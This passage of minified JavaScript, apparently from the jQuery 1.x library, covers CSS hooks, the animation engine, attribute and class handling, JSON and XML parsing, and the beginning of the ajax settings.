b,c,d,i;c=y.getElementsByTagName("body")[0],c&&c.style&&(b=y.createElement("div"),d=y.createElement("div"),d.style.cssText="position:absolute;border:0;width:0;height:0;top:0;left:-9999px",c.appendChild(d).appendChild(b),b.style.cssText="-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;display:block;margin-top:1%;top:1%;border:1px;padding:1px;width:4px;position:absolute",e=f=!1,h=!0,a.getComputedStyle&&(e="1%"!==(a.getComputedStyle(b,null)||{}).top,f="4px"===(a.getComputedStyle(b,null)||{width:"4px"}).width,i=b.appendChild(y.createElement("div")),i.style.cssText=b.style.cssText="-webkit-box-sizing:content-box;-moz-box-sizing:content-box;box-sizing:content-box;display:block;margin:0;border:0;padding:0",i.style.marginRight=i.style.width="0",b.style.width="1px",h=!parseFloat((a.getComputedStyle(i,null)||{}).marginRight),b.removeChild(i)),b.innerHTML="<table><tr><td></td><td>t</td></tr></table>",i=b.getElementsByTagName("td"),i[0].style.cssText="margin:0;border:0;padding:0;display:none",g=0===i[0].offsetHeight,g&&(i[0].style.display="",i[1].style.display="none",g=0===i[0].offsetHeight),c.removeChild(d))}}}(),m.swap=function(a,b,c,d){var e,f,g={};for(f in b)g[f]=a.style[f],a.style[f]=b[f];e=c.apply(a,d||[]);for(f in b)a.style[f]=g[f];return e};var Mb=/alpha\([^)]*\)/i,Nb=/opacity\s*=\s*([^)]*)/,Ob=/^(none|table(?!-c[ea]).+)/,Pb=new RegExp("^("+S+")(.*)$","i"),Qb=new RegExp("^([+-])=("+S+")","i"),Rb={position:"absolute",visibility:"hidden",display:"block"},Sb={letterSpacing:"0",fontWeight:"400"},Tb=["Webkit","O","Moz","ms"];function Ub(a,b){if(b in a)return b;var c=b.charAt(0).toUpperCase()+b.slice(1),d=b,e=Tb.length;while(e--)if(b=Tb[e]+c,b in a)return b;return d}function Vb(a,b){for(var c,d,e,f=[],g=0,h=a.length;h>g;g++)d=a[g],d.style&&(f[g]=m._data(d,"olddisplay"),c=d.style.display,b?(f[g]||"none"!==c||(d.style.display=""),""===d.style.display&&U(d)&&(f[g]=m._data(d,"olddisplay",Fb(d.nodeName)))):(e=U(d),(c&&"none"!==c||!e)&&m._data(d,"olddisplay",e?c:m.css(d,"display"))));for(g=0;h>g;g++)d=a[g],d.style&&(b&&"none"!==d.style.display&&""!==d.style.display||(d.style.display=b?f[g]||"":"none"));return a}function Wb(a,b,c){var d=Pb.exec(b);return d?Math.max(0,d[1]-(c||0))+(d[2]||"px"):b}function Xb(a,b,c,d,e){for(var f=c===(d?"border":"content")?4:"width"===b?1:0,g=0;4>f;f+=2)"margin"===c&&(g+=m.css(a,c+T[f],!0,e)),d?("content"===c&&(g-=m.css(a,"padding"+T[f],!0,e)),"margin"!==c&&(g-=m.css(a,"border"+T[f]+"Width",!0,e))):(g+=m.css(a,"padding"+T[f],!0,e),"padding"!==c&&(g+=m.css(a,"border"+T[f]+"Width",!0,e)));return g}function Yb(a,b,c){var d=!0,e="width"===b?a.offsetWidth:a.offsetHeight,f=Ib(a),g=k.boxSizing&&"border-box"===m.css(a,"boxSizing",!1,f);if(0>=e||null==e){if(e=Jb(a,b,f),(0>e||null==e)&&(e=a.style[b]),Hb.test(e))return e;d=g&&(k.boxSizingReliable()||e===a.style[b]),e=parseFloat(e)||0}return e+Xb(a,b,c||(g?"border":"content"),d,f)+"px"}m.extend({cssHooks:{opacity:{get:function(a,b){if(b){var c=Jb(a,"opacity");return""===c?"1":c}}}},cssNumber:{columnCount:!0,fillOpacity:!0,flexGrow:!0,flexShrink:!0,fontWeight:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,widows:!0,zIndex:!0,zoom:!0},cssProps:{"float":k.cssFloat?"cssFloat":"styleFloat"},style:function(a,b,c,d){if(a&&3!==a.nodeType&&8!==a.nodeType&&a.style){var e,f,g,h=m.camelCase(b),i=a.style;if(b=m.cssProps[h]||(m.cssProps[h]=Ub(i,h)),g=m.cssHooks[b]||m.cssHooks[h],void 0===c)return g&&"get"in g&&void 0!==(e=g.get(a,!1,d))?e:i[b];if(f=typeof c,"string"===f&&(e=Qb.exec(c))&&(c=(e[1]+1)*e[2]+parseFloat(m.css(a,b)),f="number"),null!=c&&c===c&&("number"!==f||m.cssNumber[h]||(c+="px"),k.clearCloneStyle||""!==c||0!==b.indexOf("background")||(i[b]="inherit"),!(g&&"set"in g&&void 0===(c=g.set(a,c,d)))))try{i[b]=c}catch(j){}}},css:function(a,b,c,d){var e,f,g,h=m.camelCase(b);return b=m.cssProps[h]||(m.cssProps[h]=Ub(a.style,h)),g=m.cssHooks[b]||m.cssHooks[h],g&&"get"in g&&(f=g.get(a,!0,c)),void 0===f&&(f=Jb(a,b,d)),"normal"===f&&b in Sb&&(f=Sb[b]),""===c||c?(e=parseFloat(f),c===!0||m.isNumeric(e)?e||0:f):f}}),m.each(["height","width"],function(a,b){m.cssHooks[b]={get:function(a,c,d){return c?Ob.test(m.css(a,"display"))&&0===a.offsetWidth?m.swap(a,Rb,function(){return Yb(a,b,d)}):Yb(a,b,d):void 0},set:function(a,c,d){var e=d&&Ib(a);return Wb(a,c,d?Xb(a,b,d,k.boxSizing&&"border-box"===m.css(a,"boxSizing",!1,e),e):0)}}}),k.opacity||(m.cssHooks.opacity={get:function(a,b){return Nb.test((b&&a.currentStyle?a.currentStyle.filter:a.style.filter)||"")?.01*parseFloat(RegExp.$1)+"":b?"1":""},set:function(a,b){var c=a.style,d=a.currentStyle,e=m.isNumeric(b)?"alpha(opacity="+100*b+")":"",f=d&&d.filter||c.filter||"";c.zoom=1,(b>=1||""===b)&&""===m.trim(f.replace(Mb,""))&&c.removeAttribute&&(c.removeAttribute("filter"),""===b||d&&!d.filter)||(c.filter=Mb.test(f)?f.replace(Mb,e):f+" "+e)}}),m.cssHooks.marginRight=Lb(k.reliableMarginRight,function(a,b){return b?m.swap(a,{display:"inline-block"},Jb,[a,"marginRight"]):void 0}),m.each({margin:"",padding:"",border:"Width"},function(a,b){m.cssHooks[a+b]={expand:function(c){for(var d=0,e={},f="string"==typeof c?c.split(" "):[c];4>d;d++)e[a+T[d]+b]=f[d]||f[d-2]||f[0];return e}},Gb.test(a)||(m.cssHooks[a+b].set=Wb)}),m.fn.extend({css:function(a,b){return V(this,function(a,b,c){var d,e,f={},g=0;if(m.isArray(b)){for(d=Ib(a),e=b.length;e>g;g++)f[b[g]]=m.css(a,b[g],!1,d);return f}return void 0!==c?m.style(a,b,c):m.css(a,b)},a,b,arguments.length>1)},show:function(){return Vb(this,!0)},hide:function(){return Vb(this)},toggle:function(a){return"boolean"==typeof a?a?this.show():this.hide():this.each(function(){U(this)?m(this).show():m(this).hide()})}});function Zb(a,b,c,d,e){return new Zb.prototype.init(a,b,c,d,e)
}m.Tween=Zb,Zb.prototype={constructor:Zb,init:function(a,b,c,d,e,f){this.elem=a,this.prop=c,this.easing=e||"swing",this.options=b,this.start=this.now=this.cur(),this.end=d,this.unit=f||(m.cssNumber[c]?"":"px")},cur:function(){var a=Zb.propHooks[this.prop];return a&&a.get?a.get(this):Zb.propHooks._default.get(this)},run:function(a){var b,c=Zb.propHooks[this.prop];return this.pos=b=this.options.duration?m.easing[this.easing](a,this.options.duration*a,0,1,this.options.duration):a,this.now=(this.end-this.start)*b+this.start,this.options.step&&this.options.step.call(this.elem,this.now,this),c&&c.set?c.set(this):Zb.propHooks._default.set(this),this}},Zb.prototype.init.prototype=Zb.prototype,Zb.propHooks={_default:{get:function(a){var b;return null==a.elem[a.prop]||a.elem.style&&null!=a.elem.style[a.prop]?(b=m.css(a.elem,a.prop,""),b&&"auto"!==b?b:0):a.elem[a.prop]},set:function(a){m.fx.step[a.prop]?m.fx.step[a.prop](a):a.elem.style&&(null!=a.elem.style[m.cssProps[a.prop]]||m.cssHooks[a.prop])?m.style(a.elem,a.prop,a.now+a.unit):a.elem[a.prop]=a.now}}},Zb.propHooks.scrollTop=Zb.propHooks.scrollLeft={set:function(a){a.elem.nodeType&&a.elem.parentNode&&(a.elem[a.prop]=a.now)}},m.easing={linear:function(a){return a},swing:function(a){return.5-Math.cos(a*Math.PI)/2}},m.fx=Zb.prototype.init,m.fx.step={};var $b,_b,ac=/^(?:toggle|show|hide)$/,bc=new RegExp("^(?:([+-])=|)("+S+")([a-z%]*)$","i"),cc=/queueHooks$/,dc=[ic],ec={"*":[function(a,b){var c=this.createTween(a,b),d=c.cur(),e=bc.exec(b),f=e&&e[3]||(m.cssNumber[a]?"":"px"),g=(m.cssNumber[a]||"px"!==f&&+d)&&bc.exec(m.css(c.elem,a)),h=1,i=20;if(g&&g[3]!==f){f=f||g[3],e=e||[],g=+d||1;do h=h||".5",g/=h,m.style(c.elem,a,g+f);while(h!==(h=c.cur()/d)&&1!==h&&--i)}return e&&(g=c.start=+g||+d||0,c.unit=f,c.end=e[1]?g+(e[1]+1)*e[2]:+e[2]),c}]};function fc(){return setTimeout(function(){$b=void 0}),$b=m.now()}function gc(a,b){var c,d={height:a},e=0;for(b=b?1:0;4>e;e+=2-b)c=T[e],d["margin"+c]=d["padding"+c]=a;return b&&(d.opacity=d.width=a),d}function hc(a,b,c){for(var d,e=(ec[b]||[]).concat(ec["*"]),f=0,g=e.length;g>f;f++)if(d=e[f].call(c,b,a))return d}function ic(a,b,c){var d,e,f,g,h,i,j,l,n=this,o={},p=a.style,q=a.nodeType&&U(a),r=m._data(a,"fxshow");c.queue||(h=m._queueHooks(a,"fx"),null==h.unqueued&&(h.unqueued=0,i=h.empty.fire,h.empty.fire=function(){h.unqueued||i()}),h.unqueued++,n.always(function(){n.always(function(){h.unqueued--,m.queue(a,"fx").length||h.empty.fire()})})),1===a.nodeType&&("height"in b||"width"in b)&&(c.overflow=[p.overflow,p.overflowX,p.overflowY],j=m.css(a,"display"),l="none"===j?m._data(a,"olddisplay")||Fb(a.nodeName):j,"inline"===l&&"none"===m.css(a,"float")&&(k.inlineBlockNeedsLayout&&"inline"!==Fb(a.nodeName)?p.zoom=1:p.display="inline-block")),c.overflow&&(p.overflow="hidden",k.shrinkWrapBlocks()||n.always(function(){p.overflow=c.overflow[0],p.overflowX=c.overflow[1],p.overflowY=c.overflow[2]}));for(d in b)if(e=b[d],ac.exec(e)){if(delete b[d],f=f||"toggle"===e,e===(q?"hide":"show")){if("show"!==e||!r||void 0===r[d])continue;q=!0}o[d]=r&&r[d]||m.style(a,d)}else j=void 0;if(m.isEmptyObject(o))"inline"===("none"===j?Fb(a.nodeName):j)&&(p.display=j);else{r?"hidden"in r&&(q=r.hidden):r=m._data(a,"fxshow",{}),f&&(r.hidden=!q),q?m(a).show():n.done(function(){m(a).hide()}),n.done(function(){var b;m._removeData(a,"fxshow");for(b in o)m.style(a,b,o[b])});for(d in o)g=hc(q?r[d]:0,d,n),d in r||(r[d]=g.start,q&&(g.end=g.start,g.start="width"===d||"height"===d?1:0))}}function jc(a,b){var c,d,e,f,g;for(c in a)if(d=m.camelCase(c),e=b[d],f=a[c],m.isArray(f)&&(e=f[1],f=a[c]=f[0]),c!==d&&(a[d]=f,delete a[c]),g=m.cssHooks[d],g&&"expand"in g){f=g.expand(f),delete a[d];for(c in f)c in a||(a[c]=f[c],b[c]=e)}else b[d]=e}function kc(a,b,c){var d,e,f=0,g=dc.length,h=m.Deferred().always(function(){delete i.elem}),i=function(){if(e)return!1;for(var b=$b||fc(),c=Math.max(0,j.startTime+j.duration-b),d=c/j.duration||0,f=1-d,g=0,i=j.tweens.length;i>g;g++)j.tweens[g].run(f);return h.notifyWith(a,[j,f,c]),1>f&&i?c:(h.resolveWith(a,[j]),!1)},j=h.promise({elem:a,props:m.extend({},b),opts:m.extend(!0,{specialEasing:{}},c),originalProperties:b,originalOptions:c,startTime:$b||fc(),duration:c.duration,tweens:[],createTween:function(b,c){var d=m.Tween(a,j.opts,b,c,j.opts.specialEasing[b]||j.opts.easing);return j.tweens.push(d),d},stop:function(b){var c=0,d=b?j.tweens.length:0;if(e)return this;for(e=!0;d>c;c++)j.tweens[c].run(1);return b?h.resolveWith(a,[j,b]):h.rejectWith(a,[j,b]),this}}),k=j.props;for(jc(k,j.opts.specialEasing);g>f;f++)if(d=dc[f].call(j,a,k,j.opts))return d;return m.map(k,hc,j),m.isFunction(j.opts.start)&&j.opts.start.call(a,j),m.fx.timer(m.extend(i,{elem:a,anim:j,queue:j.opts.queue})),j.progress(j.opts.progress).done(j.opts.done,j.opts.complete).fail(j.opts.fail).always(j.opts.always)}m.Animation=m.extend(kc,{tweener:function(a,b){m.isFunction(a)?(b=a,a=["*"]):a=a.split(" ");for(var c,d=0,e=a.length;e>d;d++)c=a[d],ec[c]=ec[c]||[],ec[c].unshift(b)},prefilter:function(a,b){b?dc.unshift(a):dc.push(a)}}),m.speed=function(a,b,c){var d=a&&"object"==typeof a?m.extend({},a):{complete:c||!c&&b||m.isFunction(a)&&a,duration:a,easing:c&&b||b&&!m.isFunction(b)&&b};return d.duration=m.fx.off?0:"number"==typeof d.duration?d.duration:d.duration in m.fx.speeds?m.fx.speeds[d.duration]:m.fx.speeds._default,(null==d.queue||d.queue===!0)&&(d.queue="fx"),d.old=d.complete,d.complete=function(){m.isFunction(d.old)&&d.old.call(this),d.queue&&m.dequeue(this,d.queue)},d},m.fn.extend({fadeTo:function(a,b,c,d){return this.filter(U).css("opacity",0).show().end().animate({opacity:b},a,c,d)},animate:function(a,b,c,d){var e=m.isEmptyObject(a),f=m.speed(b,c,d),g=function(){var b=kc(this,m.extend({},a),f);(e||m._data(this,"finish"))&&b.stop(!0)};return g.finish=g,e||f.queue===!1?this.each(g):this.queue(f.queue,g)},stop:function(a,b,c){var d=function(a){var b=a.stop;delete a.stop,b(c)};return"string"!=typeof a&&(c=b,b=a,a=void 0),b&&a!==!1&&this.queue(a||"fx",[]),this.each(function(){var b=!0,e=null!=a&&a+"queueHooks",f=m.timers,g=m._data(this);if(e)g[e]&&g[e].stop&&d(g[e]);else for(e in g)g[e]&&g[e].stop&&cc.test(e)&&d(g[e]);for(e=f.length;e--;)f[e].elem!==this||null!=a&&f[e].queue!==a||(f[e].anim.stop(c),b=!1,f.splice(e,1));(b||!c)&&m.dequeue(this,a)})},finish:function(a){return a!==!1&&(a=a||"fx"),this.each(function(){var b,c=m._data(this),d=c[a+"queue"],e=c[a+"queueHooks"],f=m.timers,g=d?d.length:0;for(c.finish=!0,m.queue(this,a,[]),e&&e.stop&&e.stop.call(this,!0),b=f.length;b--;)f[b].elem===this&&f[b].queue===a&&(f[b].anim.stop(!0),f.splice(b,1));for(b=0;g>b;b++)d[b]&&d[b].finish&&d[b].finish.call(this);delete c.finish})}}),m.each(["toggle","show","hide"],function(a,b){var c=m.fn[b];m.fn[b]=function(a,d,e){return null==a||"boolean"==typeof a?c.apply(this,arguments):this.animate(gc(b,!0),a,d,e)}}),m.each({slideDown:gc("show"),slideUp:gc("hide"),slideToggle:gc("toggle"),fadeIn:{opacity:"show"},fadeOut:{opacity:"hide"},fadeToggle:{opacity:"toggle"}},function(a,b){m.fn[a]=function(a,c,d){return this.animate(b,a,c,d)}}),m.timers=[],m.fx.tick=function(){var a,b=m.timers,c=0;for($b=m.now();c<b.length;c++)a=b[c],a()||b[c]!==a||b.splice(c--,1);b.length||m.fx.stop(),$b=void 0},m.fx.timer=function(a){m.timers.push(a),a()?m.fx.start():m.timers.pop()},m.fx.interval=13,m.fx.start=function(){_b||(_b=setInterval(m.fx.tick,m.fx.interval))},m.fx.stop=function(){clearInterval(_b),_b=null},m.fx.speeds={slow:600,fast:200,_default:400},m.fn.delay=function(a,b){return a=m.fx?m.fx.speeds[a]||a:a,b=b||"fx",this.queue(b,function(b,c){var d=setTimeout(b,a);c.stop=function(){clearTimeout(d)}})},function(){var a,b,c,d,e;b=y.createElement("div"),b.setAttribute("className","t"),b.innerHTML="  <link/><table></table><a href='/a'>a</a><input type='checkbox'/>",d=b.getElementsByTagName("a")[0],c=y.createElement("select"),e=c.appendChild(y.createElement("option")),a=b.getElementsByTagName("input")[0],d.style.cssText="top:1px",k.getSetAttribute="t"!==b.className,k.style=/top/.test(d.getAttribute("style")),k.hrefNormalized="/a"===d.getAttribute("href"),k.checkOn=!!a.value,k.optSelected=e.selected,k.enctype=!!y.createElement("form").enctype,c.disabled=!0,k.optDisabled=!e.disabled,a=y.createElement("input"),a.setAttribute("value",""),k.input=""===a.getAttribute("value"),a.value="t",a.setAttribute("type","radio"),k.radioValue="t"===a.value}();var lc=/\r/g;m.fn.extend({val:function(a){var b,c,d,e=this[0];{if(arguments.length)return d=m.isFunction(a),this.each(function(c){var e;1===this.nodeType&&(e=d?a.call(this,c,m(this).val()):a,null==e?e="":"number"==typeof e?e+="":m.isArray(e)&&(e=m.map(e,function(a){return null==a?"":a+""})),b=m.valHooks[this.type]||m.valHooks[this.nodeName.toLowerCase()],b&&"set"in b&&void 0!==b.set(this,e,"value")||(this.value=e))});if(e)return b=m.valHooks[e.type]||m.valHooks[e.nodeName.toLowerCase()],b&&"get"in b&&void 0!==(c=b.get(e,"value"))?c:(c=e.value,"string"==typeof c?c.replace(lc,""):null==c?"":c)}}}),m.extend({valHooks:{option:{get:function(a){var b=m.find.attr(a,"value");return null!=b?b:m.trim(m.text(a))}},select:{get:function(a){for(var b,c,d=a.options,e=a.selectedIndex,f="select-one"===a.type||0>e,g=f?null:[],h=f?e+1:d.length,i=0>e?h:f?e:0;h>i;i++)if(c=d[i],!(!c.selected&&i!==e||(k.optDisabled?c.disabled:null!==c.getAttribute("disabled"))||c.parentNode.disabled&&m.nodeName(c.parentNode,"optgroup"))){if(b=m(c).val(),f)return b;g.push(b)}return g},set:function(a,b){var c,d,e=a.options,f=m.makeArray(b),g=e.length;while(g--)if(d=e[g],m.inArray(m.valHooks.option.get(d),f)>=0)try{d.selected=c=!0}catch(h){d.scrollHeight}else d.selected=!1;return c||(a.selectedIndex=-1),e}}}}),m.each(["radio","checkbox"],function(){m.valHooks[this]={set:function(a,b){return m.isArray(b)?a.checked=m.inArray(m(a).val(),b)>=0:void 0}},k.checkOn||(m.valHooks[this].get=function(a){return null===a.getAttribute("value")?"on":a.value})});var mc,nc,oc=m.expr.attrHandle,pc=/^(?:checked|selected)$/i,qc=k.getSetAttribute,rc=k.input;m.fn.extend({attr:function(a,b){return V(this,m.attr,a,b,arguments.length>1)},removeAttr:function(a){return this.each(function(){m.removeAttr(this,a)})}}),m.extend({attr:function(a,b,c){var d,e,f=a.nodeType;if(a&&3!==f&&8!==f&&2!==f)return typeof a.getAttribute===K?m.prop(a,b,c):(1===f&&m.isXMLDoc(a)||(b=b.toLowerCase(),d=m.attrHooks[b]||(m.expr.match.bool.test(b)?nc:mc)),void 0===c?d&&"get"in d&&null!==(e=d.get(a,b))?e:(e=m.find.attr(a,b),null==e?void 0:e):null!==c?d&&"set"in d&&void 0!==(e=d.set(a,c,b))?e:(a.setAttribute(b,c+""),c):void m.removeAttr(a,b))},removeAttr:function(a,b){var c,d,e=0,f=b&&b.match(E);if(f&&1===a.nodeType)while(c=f[e++])d=m.propFix[c]||c,m.expr.match.bool.test(c)?rc&&qc||!pc.test(c)?a[d]=!1:a[m.camelCase("default-"+c)]=a[d]=!1:m.attr(a,c,""),a.removeAttribute(qc?c:d)},attrHooks:{type:{set:function(a,b){if(!k.radioValue&&"radio"===b&&m.nodeName(a,"input")){var c=a.value;return a.setAttribute("type",b),c&&(a.value=c),b}}}}}),nc={set:function(a,b,c){return b===!1?m.removeAttr(a,c):rc&&qc||!pc.test(c)?a.setAttribute(!qc&&m.propFix[c]||c,c):a[m.camelCase("default-"+c)]=a[c]=!0,c}},m.each(m.expr.match.bool.source.match(/\w+/g),function(a,b){var c=oc[b]||m.find.attr;oc[b]=rc&&qc||!pc.test(b)?function(a,b,d){var e,f;return d||(f=oc[b],oc[b]=e,e=null!=c(a,b,d)?b.toLowerCase():null,oc[b]=f),e}:function(a,b,c){return c?void 0:a[m.camelCase("default-"+b)]?b.toLowerCase():null}}),rc&&qc||(m.attrHooks.value={set:function(a,b,c){return m.nodeName(a,"input")?void(a.defaultValue=b):mc&&mc.set(a,b,c)}}),qc||(mc={set:function(a,b,c){var d=a.getAttributeNode(c);return d||a.setAttributeNode(d=a.ownerDocument.createAttribute(c)),d.value=b+="","value"===c||b===a.getAttribute(c)?b:void 0}},oc.id=oc.name=oc.coords=function(a,b,c){var d;return c?void 0:(d=a.getAttributeNode(b))&&""!==d.value?d.value:null},m.valHooks.button={get:function(a,b){var c=a.getAttributeNode(b);return c&&c.specified?c.value:void 0},set:mc.set},m.attrHooks.contenteditable={set:function(a,b,c){mc.set(a,""===b?!1:b,c)}},m.each(["width","height"],function(a,b){m.attrHooks[b]={set:function(a,c){return""===c?(a.setAttribute(b,"auto"),c):void 0}}})),k.style||(m.attrHooks.style={get:function(a){return a.style.cssText||void 0},set:function(a,b){return a.style.cssText=b+""}});var sc=/^(?:input|select|textarea|button|object)$/i,tc=/^(?:a|area)$/i;m.fn.extend({prop:function(a,b){return V(this,m.prop,a,b,arguments.length>1)},removeProp:function(a){return a=m.propFix[a]||a,this.each(function(){try{this[a]=void 0,delete this[a]}catch(b){}})}}),m.extend({propFix:{"for":"htmlFor","class":"className"},prop:function(a,b,c){var d,e,f,g=a.nodeType;if(a&&3!==g&&8!==g&&2!==g)return f=1!==g||!m.isXMLDoc(a),f&&(b=m.propFix[b]||b,e=m.propHooks[b]),void 0!==c?e&&"set"in e&&void 0!==(d=e.set(a,c,b))?d:a[b]=c:e&&"get"in e&&null!==(d=e.get(a,b))?d:a[b]},propHooks:{tabIndex:{get:function(a){var b=m.find.attr(a,"tabindex");return b?parseInt(b,10):sc.test(a.nodeName)||tc.test(a.nodeName)&&a.href?0:-1}}}}),k.hrefNormalized||m.each(["href","src"],function(a,b){m.propHooks[b]={get:function(a){return a.getAttribute(b,4)}}}),k.optSelected||(m.propHooks.selected={get:function(a){var b=a.parentNode;return b&&(b.selectedIndex,b.parentNode&&b.parentNode.selectedIndex),null}}),m.each(["tabIndex","readOnly","maxLength","cellSpacing","cellPadding","rowSpan","colSpan","useMap","frameBorder","contentEditable"],function(){m.propFix[this.toLowerCase()]=this}),k.enctype||(m.propFix.enctype="encoding");var uc=/[\t\r\n\f]/g;m.fn.extend({addClass:function(a){var b,c,d,e,f,g,h=0,i=this.length,j="string"==typeof a&&a;if(m.isFunction(a))return this.each(function(b){m(this).addClass(a.call(this,b,this.className))});if(j)for(b=(a||"").match(E)||[];i>h;h++)if(c=this[h],d=1===c.nodeType&&(c.className?(" "+c.className+" ").replace(uc," "):" ")){f=0;while(e=b[f++])d.indexOf(" "+e+" ")<0&&(d+=e+" ");g=m.trim(d),c.className!==g&&(c.className=g)}return this},removeClass:function(a){var b,c,d,e,f,g,h=0,i=this.length,j=0===arguments.length||"string"==typeof a&&a;if(m.isFunction(a))return this.each(function(b){m(this).removeClass(a.call(this,b,this.className))});if(j)for(b=(a||"").match(E)||[];i>h;h++)if(c=this[h],d=1===c.nodeType&&(c.className?(" "+c.className+" ").replace(uc," "):"")){f=0;while(e=b[f++])while(d.indexOf(" "+e+" ")>=0)d=d.replace(" "+e+" "," ");g=a?m.trim(d):"",c.className!==g&&(c.className=g)}return this},toggleClass:function(a,b){var c=typeof a;return"boolean"==typeof b&&"string"===c?b?this.addClass(a):this.removeClass(a):this.each(m.isFunction(a)?function(c){m(this).toggleClass(a.call(this,c,this.className,b),b)}:function(){if("string"===c){var b,d=0,e=m(this),f=a.match(E)||[];while(b=f[d++])e.hasClass(b)?e.removeClass(b):e.addClass(b)}else(c===K||"boolean"===c)&&(this.className&&m._data(this,"__className__",this.className),this.className=this.className||a===!1?"":m._data(this,"__className__")||"")})},hasClass:function(a){for(var b=" "+a+" ",c=0,d=this.length;d>c;c++)if(1===this[c].nodeType&&(" "+this[c].className+" ").replace(uc," ").indexOf(b)>=0)return!0;return!1}}),m.each("blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error contextmenu".split(" "),function(a,b){m.fn[b]=function(a,c){return arguments.length>0?this.on(b,null,a,c):this.trigger(b)}}),m.fn.extend({hover:function(a,b){return this.mouseenter(a).mouseleave(b||a)},bind:function(a,b,c){return this.on(a,null,b,c)},unbind:function(a,b){return this.off(a,null,b)},delegate:function(a,b,c,d){return this.on(b,a,c,d)},undelegate:function(a,b,c){return 1===arguments.length?this.off(a,"**"):this.off(b,a||"**",c)}});var vc=m.now(),wc=/\?/,xc=/(,)|(\[|{)|(}|])|"(?:[^"\\\r\n]|\\["\\\/bfnrt]|\\u[\da-fA-F]{4})*"\s*:?|true|false|null|-?(?!0\d)\d+(?:\.\d+|)(?:[eE][+-]?\d+|)/g;m.parseJSON=function(b){if(a.JSON&&a.JSON.parse)return a.JSON.parse(b+"");var c,d=null,e=m.trim(b+"");return e&&!m.trim(e.replace(xc,function(a,b,e,f){return c&&b&&(d=0),0===d?a:(c=e||b,d+=!f-!e,"")}))?Function("return "+e)():m.error("Invalid JSON: "+b)},m.parseXML=function(b){var c,d;if(!b||"string"!=typeof b)return null;try{a.DOMParser?(d=new DOMParser,c=d.parseFromString(b,"text/xml")):(c=new ActiveXObject("Microsoft.XMLDOM"),c.async="false",c.loadXML(b))}catch(e){c=void 0}return c&&c.documentElement&&!c.getElementsByTagName("parsererror").length||m.error("Invalid XML: "+b),c};var yc,zc,Ac=/#.*$/,Bc=/([?&])_=[^&]*/,Cc=/^(.*?):[ \t]*([^\r\n]*)\r?$/gm,Dc=/^(?:about|app|app-storage|.+-extension|file|res|widget):$/,Ec=/^(?:GET|HEAD)$/,Fc=/^\/\//,Gc=/^([\w.+-]+:)(?:\/\/(?:[^\/?#]*@|)([^\/?#:]*)(?::(\d+)|)|)/,Hc={},Ic={},Jc="*/".concat("*");try{zc=location.href}catch(Kc){zc=y.createElement("a"),zc.href="",zc=zc.href}yc=Gc.exec(zc.toLowerCase())||[];function Lc(a){return function(b,c){"string"!=typeof b&&(c=b,b="*");var d,e=0,f=b.toLowerCase().match(E)||[];if(m.isFunction(c))while(d=f[e++])"+"===d.charAt(0)?(d=d.slice(1)||"*",(a[d]=a[d]||[]).unshift(c)):(a[d]=a[d]||[]).push(c)}}function Mc(a,b,c,d){var e={},f=a===Ic;function g(h){var i;return e[h]=!0,m.each(a[h]||[],function(a,h){var j=h(b,c,d);return"string"!=typeof j||f||e[j]?f?!(i=j):void 0:(b.dataTypes.unshift(j),g(j),!1)}),i}return g(b.dataTypes[0])||!e["*"]&&g("*")}function Nc(a,b){var c,d,e=m.ajaxSettings.flatOptions||{};for(d in b)void 0!==b[d]&&((e[d]?a:c||(c={}))[d]=b[d]);return c&&m.extend(!0,a,c),a}function Oc(a,b,c){var d,e,f,g,h=a.contents,i=a.dataTypes;while("*"===i[0])i.shift(),void 0===e&&(e=a.mimeType||b.getResponseHeader("Content-Type"));if(e)for(g in h)if(h[g]&&h[g].test(e)){i.unshift(g);break}if(i[0]in c)f=i[0];else{for(g in c){if(!i[0]||a.converters[g+" "+i[0]]){f=g;break}d||(d=g)}f=f||d}return f?(f!==i[0]&&i.unshift(f),c[f]):void 0}function Pc(a,b,c,d){var e,f,g,h,i,j={},k=a.dataTypes.slice();if(k[1])for(g in a.converters)j[g.toLowerCase()]=a.converters[g];f=k.shift();while(f)if(a.responseFields[f]&&(c[a.responseFields[f]]=b),!i&&d&&a.dataFilter&&(b=a.dataFilter(b,a.dataType)),i=f,f=k.shift())if("*"===f)f=i;else if("*"!==i&&i!==f){if(g=j[i+" "+f]||j["* "+f],!g)for(e in j)if(h=e.split(" "),h[1]===f&&(g=j[i+" "+h[0]]||j["* "+h[0]])){g===!0?g=j[e]:j[e]!==!0&&(f=h[0],k.unshift(h[1]));break}if(g!==!0)if(g&&a["throws"])b=g(b);else try{b=g(b)}catch(l){return{state:"parsererror",error:g?l:"No conversion from "+i+" to "+f}}}return{state:"success",data:b}}m.extend({active:0,lastModified:{},etag:{},ajaxSettings:{url:zc,type:"GET",isLocal:Dc.test(yc[1]),global:!0,processData:!0,async:!0,contentType:"application/x-www-form-urlencoded; charset=UTF-8",accepts:{"*":Jc,text:"text/plain",html:"text/html",xml:"application/xml, text/xml",json:"application/json, text/javascript"},contents:{xml:/xml/,html:/html/,json:/json/},responseFields:{xml:"responseXML",text:"responseText",json:"responseJSON"},converters:{"* text":String,"text html":!0,"text json":m.parseJSON,"text xml":m.parseXML},flatOptions:{url:!0,context:!0}},ajaxSetup:function(a,b){return b?Nc(Nc(a,m.ajaxSettings),b):Nc(m.ajaxSettings,a)},ajaxPrefilter:Lc(Hc),ajaxTransport:Lc(Ic),ajax:function(a,b){"object"==typeof a&&(b=a,a=void 0),b=b||{};var c,d,e,f,g,h,i,j,k=m.ajaxSetup({},b),l=k.context||k,n=k.context&&(l.nodeType||l.jquery)?m(l):m.event,o=m.Deferred(),p=m.Callbacks("once memory"),q=k.statusCode||{},r={},s={},t=0,u="canceled",v={readyState:0,getResponseHeader:function(a){var b;if(2===t){if(!j){j={};while(b=Cc.exec(f))j[b[1].toLowerCase()]=b[2]}b=j[a.toLowerCase()]}return null==b?null:b},getAllResponseHeaders:function(){return 2===t?f:null},setRequestHeader:function(a,b){var c=a.toLowerCase();return t||(a=s[c]=s[c]||a,r[a]=b),this},overrideMimeType:function(a){return t||(k.mimeType=a),this},statusCode:function(a){var b;if(a)if(2>t)for(b in a)q[b]=[q[b],a[b]];else v.always(a[v.status]);return this},abort:function(a){var b=a||u;return 